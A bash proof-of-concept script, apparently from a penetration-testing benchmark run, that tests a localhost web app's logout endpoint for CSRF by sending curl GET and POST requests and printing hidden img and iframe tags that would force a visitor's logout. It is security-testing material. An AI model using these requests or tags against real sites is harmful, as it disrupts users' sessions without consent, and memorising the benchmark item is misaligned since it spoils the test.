#!/bin/bash
# POC: CSRF vulnerability on GET-based logout endpoint - demonstrates that logout can be triggered without CSRF token via GET request, bypassing CSRF protection
# Target: ./repo
# Created: 2025-11-07T18:56:17.332Z
# Session: benchmark-XBEN-056-24-mhp7ee7e

# CSRF Vulnerability on GET-Based Logout Endpoint POC
# This script demonstrates the CSRF vulnerability where the logout endpoint
# accepts GET requests without CSRF token validation

TARGET_URL="${1:-http://localhost:8081}"
LOGOUT_ENDPOINT="/accounts/logout/"

echo "=========================================="
echo "CSRF GET-Based Logout Vulnerability POC"
echo "=========================================="
echo ""
echo "Target: $TARGET_URL"
echo "Endpoint: $LOGOUT_ENDPOINT"
echo ""

# Test 1: GET request to logout endpoint (should succeed without CSRF token)
echo "[*] Test 1: GET request to logout endpoint (without CSRF token)"
echo "Command: curl -i -X GET $TARGET_URL$LOGOUT_ENDPOINT"
RESPONSE=$(curl -s -i -X GET "$TARGET_URL$LOGOUT_ENDPOINT" 2>&1)
HTTP_CODE=$(echo "$RESPONSE" | head -n 1 | grep -oP '\d{3}')
echo "Response:"
echo "$RESPONSE"
echo ""

if [[ "$HTTP_CODE" == "302" ]]; then
    echo "[+] VULNERABLE: GET request succeeded with HTTP $HTTP_CODE (no CSRF token required)"
    GET_VULNERABLE=1
else
    echo "[-] GET request returned HTTP $HTTP_CODE"
    GET_VULNERABLE=0
fi
echo ""

# Test 2: POST request to logout endpoint (should fail without CSRF token)
echo "[*] Test 2: POST request to logout endpoint (without CSRF token)"
echo "Command: curl -i -X POST $TARGET_URL$LOGOUT_ENDPOINT"
RESPONSE=$(curl -s -i -X POST "$TARGET_URL$LOGOUT_ENDPOINT" 2>&1)
HTTP_CODE=$(echo "$RESPONSE" | head -n 1 | grep -oP '\d{3}')
echo "Response:"
echo "$RESPONSE"
echo ""

if [[ "$HTTP_CODE" == "403" ]]; then
    echo "[+] CSRF Protection Working: POST request blocked with HTTP 403"
    POST_PROTECTED=1
else
    echo "[-] POST request returned HTTP $HTTP_CODE (expected 403 for CSRF protection)"
    POST_PROTECTED=0
fi
echo ""

# Test 3: Verify that GET returns 302 redirect (successful logout)
echo "[*] Test 3: Verify GET returns 302 redirect"
echo "Command: curl -L $TARGET_URL$LOGOUT_ENDPOINT 2>&1 | head -20"
RESPONSE=$(curl -L "$TARGET_URL$LOGOUT_ENDPOINT" 2>&1 | head -20)
if echo "$RESPONSE" | grep -q "302\|Redirect\|Location"; then
    echo "[+] GET request triggers redirect (logout successful)"
    echo "Response preview:"
    echo "$RESPONSE"
else
    echo "Response:"
    echo "$RESPONSE"
fi
echo ""

# Test 4: Demonstrate attack vector - GET request embedded in HTML
echo "[*] Test 4: Attack Vector - GET request embedded in HTML"
echo "An attacker could embed this in a webpage:"
echo "<img src='$TARGET_URL$LOGOUT_ENDPOINT' style='display:none;'>"
echo "or"
echo "<iframe src='$TARGET_URL$LOGOUT_ENDPOINT' style='display:none;'></iframe>"
echo ""

# Test 5: Check for CSRF token in response
echo "[*] Test 5: Check for CSRF token in GET response"
RESPONSE=$(curl -s "$TARGET_URL$LOGOUT_ENDPOINT" 2>&1)
if echo "$RESPONSE" | grep -q "csrftoken"; then
    echo "[+] CSRF token present in response"
else
    echo "[-] No CSRF token in logout response"
fi
echo ""

# Final verdict
echo "=========================================="
echo "VULNERABILITY VERDICT:"
echo "=========================================="
if [[ "$GET_VULNERABLE" == "1" ]] && [[ "$POST_PROTECTED" == "1" ]]; then
    echo "[!] CRITICAL: GET-based logout endpoint is vulnerable to CSRF"
    echo "    - GET requests succeed without CSRF token (HTTP 302)"
    echo "    - POST requests properly require CSRF token (HTTP 403)"
    echo "    - This allows attackers to force logout via simple GET requests"
    echo ""
    echo "[!] Attack Scenario:"
    echo "    1. Attacker embeds <img src='$TARGET_URL$LOGOUT_ENDPOINT'> in webpage"
    echo "    2. Authenticated users visiting the page are automatically logged out"
    echo "    3. No user action or interaction required"
    exit 0
else
    echo "[-] Vulnerability not confirmed or already patched"
    exit 1
fi